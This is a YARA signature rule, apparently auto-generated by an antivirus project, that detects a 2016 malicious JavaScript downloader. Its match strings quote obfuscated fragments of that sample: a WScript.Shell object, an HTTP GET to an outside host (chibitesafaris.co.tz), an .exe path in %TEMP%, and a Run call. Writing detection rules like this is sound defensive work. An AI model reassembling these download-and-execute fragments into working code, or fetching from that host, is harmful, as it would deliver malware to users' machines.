rule sig_20160328_a29acf9f41fe067ff8f9278940f9c8db {
  meta:
    description = "datamaliciousorder - file 20160328_a29acf9f41fe067ff8f9278940f9c8db.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b9147c5b4c9aa4f0db969ca5286bc12290db1a92668ab3c4121f834229365f1b"

  strings:
    $s1  = "function Nerthug() {return Isjlkeyk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"2tcCaioPRF1l.exe\";};" fullword ascii
    $s2  = "var Isjlkeyk = function Pafnjvqkfu() {return WScript[Huxeziew](\"WScript.Shell\");}();" fullword ascii
    $s3  = "do {WScript[Idylhkwrin](Tlprqx() * 11)} while (Rhxux[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Pxdwoyjz(Pkupj, Xsvkgffl){return Pkupj - Xsvkgffl;};" fullword ascii
    $s5  = "Rhxux[Wpczaar](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Syrad(Luhzx){Isjlkeyk[\"Run\"](Luhzx, Qhtgbiq, Qhtgbiq);};" fullword ascii
    $s7  = "function Hgkrfxyvv() {return ((Poxnziesh == true) && (Poxnziesh == Iadrfze)) ? 1 : Qhtgbiq;};" fullword ascii
    $s8  = "function Rktwldw(){return Ssjcrw;};" fullword ascii
    $s9  = "var Ubfrhg = false;" fullword ascii
    $s10 = "function Gyjnq(Neulxfh) {var Tzjznpv = (1, 2, 3, 4, 5, Neulxfh); return Tzjznpv;};" fullword ascii
    $s11 = "var Vgvtcqmhuk = new this[\"Date\"]();" fullword ascii
    $s12 = "return Pxdwoyjz(Xwxojkbr, Aspukip);" fullword ascii
    $s13 = "function Yehvnx()" fullword ascii
    $s14 = "Iadrfze = true; " fullword ascii
    $s15 = "var Poxnziesh = false;" fullword ascii
    $s16 = "function Tlprqx(){return 22;};" fullword ascii
    $s17 = " while (Dtzomjyf){" fullword ascii
    $s18 = "function Vfojr(){return Huxeziew;};" fullword ascii
    $s19 = "Poxnziesh = true; " fullword ascii
    $s20 = "var Iadrfze = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}